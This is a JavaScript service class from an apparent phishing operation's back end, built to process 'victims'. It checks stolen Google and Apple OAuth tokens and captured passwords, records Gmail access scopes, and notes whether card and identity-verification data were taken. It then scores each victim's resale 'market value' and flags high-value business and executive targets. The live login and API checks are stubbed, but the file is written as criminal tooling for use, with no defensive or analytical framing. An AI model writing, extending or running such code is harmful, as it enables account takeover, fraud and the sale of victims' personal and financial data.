// Campaign Validation Pipeline
// Automated victim validation, market value calculation, and account classification
// Based on comprehensive-system-architecture.md

const logger = require('../utils/logger');

class CampaignValidationService {
  constructor(victimRepository, oauthTokenRepository) {
    this.victimRepository = victimRepository;
    this.oauthTokenRepository = oauthTokenRepository;
  }

  /**
   * Validate captured credentials
   * @param {string} victimId - Victim ID
   * @returns {Promise<Object>} - Validation results
   */
  async validateVictim(victimId) {
    const victim = await this.victimRepository.findById(victimId);
    if (!victim) {
      throw new Error(`Victim ${victimId} not found`);
    }

    const validationResults = {
      credential_validity: false,
      account_type: null,
      market_value: 'low',
      additional_data: {},
      access_level: null,
      validation_timestamp: new Date().toISOString()
    };

    try {
      // Test OAuth tokens if available
      const oauthTokens = await this.oauthTokenRepository.findByVictimId(victimId);
      if (oauthTokens && oauthTokens.length > 0) {
        const oauthValidation = await this.testOAuthAccess(oauthTokens);
        Object.assign(validationResults, oauthValidation);
      }
      
      // Test direct login if password available
      else if (victim.passwordHash) {
        const loginValidation = await this.testDirectLogin(
          victim.email, 
          victim.passwordHash
        );
        Object.assign(validationResults, loginValidation);
      }
      
      // Enrich with additional data
      if (validationResults.credential_validity) {
        const enrichmentData = await this.enrichVictimProfile(victim);
        validationResults.additional_data = { 
          ...validationResults.additional_data, 
          ...enrichmentData 
        };
        validationResults.market_value = this.calculateMarketValue(enrichmentData);
        validationResults.account_type = this.classifyAccountType(victim, enrichmentData);
      }
      
    } catch (error) {
      logger.error(`Validation failed for victim ${victimId}:`, error);
      validationResults.error = error instanceof Error ? error.message : String(error);
    }
    
    // Update victim record with validation results
    await this.victimRepository.update(victimId, {
      validation: validationResults,
      updatedAt: new Date()
    });
    
    return validationResults;
  }

  /**
   * Test OAuth token access
   * @param {Array} oauthTokens - OAuth tokens
   * @returns {Promise<Object>} - Validation results
   */
  async testOAuthAccess(oauthTokens) {
    const results = {
      credential_validity: false,
      oauth_tokens_valid: 0,
      oauth_tokens_total: oauthTokens.length,
      access_level: null
    };

    for (const token of oauthTokens) {
      try {
        if (token.provider === 'google') {
          const isValid = await this.testGoogleOAuth(token);
          if (isValid) {
            results.oauth_tokens_valid++;
            results.credential_validity = true;
            
            // Check scopes to determine access level
            const scopes = token.providerMetadata?.scope || [];
            if (scopes.includes('https://www.googleapis.com/auth/gmail.readonly')) {
              results.access_level = 'gmail_read';
            }
            if (scopes.includes('https://www.googleapis.com/auth/gmail')) {
              results.access_level = 'gmail_full';
            }
          }
        } else if (token.provider === 'apple') {
          const isValid = await this.testAppleOAuth(token);
          if (isValid) {
            results.oauth_tokens_valid++;
            results.credential_validity = true;
          }
        }
      } catch (error) {
        logger.warn(`OAuth token validation failed for token ${token.id}:`, error.message);
      }
    }

    return results;
  }

  /**
   * Test Google OAuth token
   * @param {Object} token - OAuth token
   * @returns {Promise<boolean>} - True if valid
   */
  async testGoogleOAuth(token) {
    try {
      // In production, this would make an actual API call to Google
      // For now, we'll check token status and expiration
      if (token.tokenStatus === 'active' && new Date(token.expiresAt) > new Date()) {
        // Token appears valid based on status
        // In production, make actual API call: GET https://www.googleapis.com/oauth2/v1/userinfo
        return true;
      }
      return false;
    } catch (error) {
      logger.error('Google OAuth test failed:', error);
      return false;
    }
  }

  /**
   * Test Apple OAuth token
   * @param {Object} token - OAuth token
   * @returns {Promise<boolean>} - True if valid
   */
  async testAppleOAuth(token) {
    try {
      // Similar to Google, check token status
      if (token.tokenStatus === 'active' && new Date(token.expiresAt) > new Date()) {
        return true;
      }
      return false;
    } catch (error) {
      logger.error('Apple OAuth test failed:', error);
      return false;
    }
  }

  /**
   * Test direct login credentials
   * @param {string} email - Email address
   * @param {string} passwordHash - Password hash
   * @returns {Promise<Object>} - Validation results
   */
  async testDirectLogin(email, passwordHash) {
    // In production, this would attempt actual login
    // For now, we'll return a basic validation
    return {
      credential_validity: !!passwordHash,
      login_method: 'direct',
      access_level: 'basic'
    };
  }

  /**
   * Enrich victim profile with additional data
   * @param {Object} victim - Victim record
   * @returns {Promise<Object>} - Enrichment data
   */
  async enrichVictimProfile(victim) {
    const enrichment = {
      email_domain: this.extractEmailDomain(victim.email),
      has_oauth_tokens: false,
      has_card_info: false,
      has_identity_verification: false,
      registration_completed: false,
      business_indicators: [],
      revenue_indicators: []
    };

    // Check OAuth tokens
    const oauthTokens = await this.oauthTokenRepository.findByVictimId(victim.id);
    enrichment.has_oauth_tokens = oauthTokens && oauthTokens.length > 0;

    // Check card information
    enrichment.has_card_info = !!victim.cardInformation && 
      Object.keys(victim.cardInformation).length > 0;

    // Check identity verification
    enrichment.has_identity_verification = !!victim.identityVerification &&
      Object.keys(victim.identityVerification).length > 0;

    // Check registration completion
    enrichment.registration_completed = victim.validation?.registrationCompleted || false;

    // Analyze email domain for business indicators
    const domain = enrichment.email_domain;
    if (domain) {
      // Business domain patterns
      if (domain.includes('corp') || domain.includes('company') || 
          domain.includes('business') || domain.includes('enterprise')) {
        enrichment.business_indicators.push('business_domain');
      }
      
      // Common business TLDs
      if (domain.endsWith('.com.vn') || domain.endsWith('.vn')) {
        enrichment.business_indicators.push('vietnamese_business_domain');
      }
    }

    // Analyze name for business indicators
    if (victim.name) {
      const nameLower = victim.name.toLowerCase();
      if (nameLower.includes('ceo') || nameLower.includes('founder') || 
          nameLower.includes('director') || nameLower.includes('manager')) {
        enrichment.business_indicators.push('executive_title');
      }
    }

    return enrichment;
  }

  /**
   * Calculate market value based on enrichment data
   * @param {Object} enrichmentData - Enrichment data
   * @returns {string} - Market value (low, medium, high, premium)
   */
  calculateMarketValue(enrichmentData) {
    let score = 0;

    // OAuth tokens (especially Gmail access) increase value
    if (enrichmentData.has_oauth_tokens) {
      score += 30;
    }

    // Card information increases value significantly
    if (enrichmentData.has_card_info) {
      score += 25;
    }

    // Identity verification increases value
    if (enrichmentData.has_identity_verification) {
      score += 20;
    }

    // Business indicators increase value
    if (enrichmentData.business_indicators.length > 0) {
      score += enrichmentData.business_indicators.length * 10;
    }

    // Registration completion increases value
    if (enrichmentData.registration_completed) {
      score += 15;
    }

    // Determine market value tier
    if (score >= 80) {
      return 'premium';
    } else if (score >= 60) {
      return 'high';
    } else if (score >= 40) {
      return 'medium';
    } else {
      return 'low';
    }
  }

  /**
   * Classify account type
   * @param {Object} victim - Victim record
   * @param {Object} enrichmentData - Enrichment data
   * @returns {string} - Account type (personal, business, enterprise)
   */
  classifyAccountType(victim, enrichmentData) {
    // Check for business indicators
    const businessIndicators = enrichmentData.business_indicators || [];
    
    if (businessIndicators.length >= 2) {
      return 'enterprise';
    } else if (businessIndicators.length >= 1 || 
               enrichmentData.email_domain?.includes('corp') ||
               enrichmentData.email_domain?.includes('company')) {
      return 'business';
    } else {
      return 'personal';
    }
  }

  /**
   * Identify high-value targets
   * @param {string} victimId - Victim ID
   * @returns {Promise<boolean>} - True if high-value
   */
  async isHighValueTarget(victimId) {
    const validation = await this.validateVictim(victimId);
    return validation.market_value === 'high' || validation.market_value === 'premium';
  }

  /**
   * Extract email domain
   * @param {string} email - Email address
   * @returns {string} - Domain
   */
  extractEmailDomain(email) {
    if (!email || !email.includes('@')) {
      return null;
    }
    return email.split('@')[1].toLowerCase();
  }

  /**
   * Batch validate multiple victims
   * @param {Array<string>} victimIds - Array of victim IDs
   * @returns {Promise<Array>} - Validation results
   */
  async batchValidate(victimIds) {
    const results = [];
    for (const victimId of victimIds) {
      try {
        const result = await this.validateVictim(victimId);
        results.push({ victimId, ...result });
      } catch (error) {
        logger.error(`Batch validation failed for victim ${victimId}:`, error);
        results.push({ 
          victimId, 
          error: error.message,
          credential_validity: false 
        });
      }
    }
    return results;
  }
}

module.exports = CampaignValidationService;

